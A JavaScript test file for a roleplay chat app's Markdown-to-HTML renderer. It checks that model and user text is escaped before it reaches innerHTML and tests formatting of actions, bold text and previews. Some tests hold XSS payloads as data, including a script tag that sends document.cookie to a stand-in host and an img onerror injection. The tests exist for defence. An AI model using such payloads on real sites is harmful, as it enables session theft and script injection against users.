// Tests for the roleplay Markdown renderer.
//
// Why these matter: formatRoleplayHtml output goes straight into innerHTML, and
// its input is model output and user text. If escaping ever regresses, a chat
// message becomes script execution inside the WebView that holds the
// AndroidServer bridge. These tests pin that behaviour down.
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const { loadAppInternals } = require('./harness.js');

const { escapeHtml, formatRoleplayHtml, stripMarkdownPreview } = loadAppInternals();

test('escapeHtml neutralizes HTML-significant characters', () => {
  assert.strictEqual(escapeHtml('<b>x</b>'), '&lt;b&gt;x&lt;/b&gt;');
  assert.strictEqual(escapeHtml('a & b'), 'a &amp; b');
  assert.strictEqual(escapeHtml('say "hi"'), 'say &quot;hi&quot;');
  // Ampersand must be escaped first, or entities get double-decoded.
  assert.strictEqual(escapeHtml('&lt;'), '&amp;lt;');
});

test('escapeHtml handles null and undefined without throwing', () => {
  assert.strictEqual(escapeHtml(null), '');
  assert.strictEqual(escapeHtml(undefined), '');
});

test('formatRoleplayHtml escapes script tags in model output', () => {
  const out = formatRoleplayHtml('<script>fetch("//evil.tld?c="+document.cookie)</script>');
  assert.ok(!out.includes('<script'), 'raw <script> must never survive rendering');
  assert.ok(out.includes('&lt;script&gt;'), 'script tag should appear escaped');
});

test('formatRoleplayHtml escapes img onerror payloads', () => {
  const out = formatRoleplayHtml('<img src=x onerror=alert(1)>');
  assert.ok(!out.includes('<img'), 'raw <img> must not be emitted');
  assert.ok(out.includes('&lt;img'));
});

test('formatRoleplayHtml prevents attribute break-out from crafted markdown', () => {
  // Mixes markdown with an attribute break-out attempt. The protection here is
  // that the double quotes are entity-escaped, so `onmouseover=` stays inert
  // text inside the element rather than becoming a real attribute.
  const out = formatRoleplayHtml('*hi" onmouseover="alert(1)*');
  assert.ok(!/"\s*onmouseover/i.test(out), 'quotes must not close the attribute');
  assert.ok(out.includes('&quot;'), 'embedded quotes must be escaped as entities');
  // The only quotes in the output should be the ones delimiting class="rp-italic".
  const rawQuotes = (out.match(/"/g) || []).length;
  assert.strictEqual(rawQuotes, 2, 'only the class attribute may use raw quotes');
});

test('formatRoleplayHtml renders *action* as muted italic without asterisks', () => {
  const out = formatRoleplayHtml('*поправляет юбку* Привет.');
  assert.ok(out.includes('<em class="rp-italic">поправляет юбку</em>'));
  assert.ok(!out.includes('*'), 'asterisk markers should be consumed');
});

test('formatRoleplayHtml renders bold and bold-italic', () => {
  assert.ok(formatRoleplayHtml('**важно**').includes('<strong>важно</strong>'));
  const bi = formatRoleplayHtml('***очень важно***');
  assert.ok(bi.includes('<strong>') && bi.includes('<em class="rp-italic">'));
});

test('formatRoleplayHtml keeps snake_case identifiers intact', () => {
  // Underscore italics are word-bounded so code-ish text is not mangled.
  const out = formatRoleplayHtml('use context_messages_limit here');
  assert.ok(out.includes('context_messages_limit'), 'snake_case must survive');
  assert.ok(!out.includes('<em'), 'no italics should be produced');
});

test('formatRoleplayHtml escapes inside fenced code blocks', () => {
  const out = formatRoleplayHtml('```js\n<script>alert(1)</script>\n```');
  assert.ok(out.includes('<pre class="md-code-block">'));
  assert.ok(!out.includes('<script>'), 'code block contents must stay escaped');
});

test('formatRoleplayHtml returns an empty paragraph for empty input', () => {
  assert.strictEqual(formatRoleplayHtml(''), '<p></p>');
  assert.strictEqual(formatRoleplayHtml(null), '<p></p>');
});

test('formatRoleplayHtml normalizes CRLF line endings', () => {
  const out = formatRoleplayHtml('первая строка\r\n\r\nвторая строка');
  assert.ok(!out.includes('\r'), 'carriage returns should be normalized away');
  assert.ok(out.includes('первая строка') && out.includes('вторая строка'));
});

test('stripMarkdownPreview produces clean single-line previews', () => {
  const preview = stripMarkdownPreview('**Привет**\n*кивает*\nКак дела?');
  assert.ok(!preview.includes('*'));
  assert.ok(!preview.includes('\n'));
  assert.ok(preview.includes('Привет'));
});

test('stripMarkdownPreview collapses code blocks to a marker', () => {
  assert.ok(stripMarkdownPreview('before ```js\ncode\n``` after').includes('[код]'));
});

test('stripMarkdownPreview drops markers a cut-off preview leaves unpaired', () => {
  // The chat list gets the last message cut to 300 characters, which can cut
  // off the closing asterisk of an action.
  assert.strictEqual(stripMarkdownPreview('*Мягкий утренний свет скользнул по'), 'Мягкий утренний свет скользнул по');
});
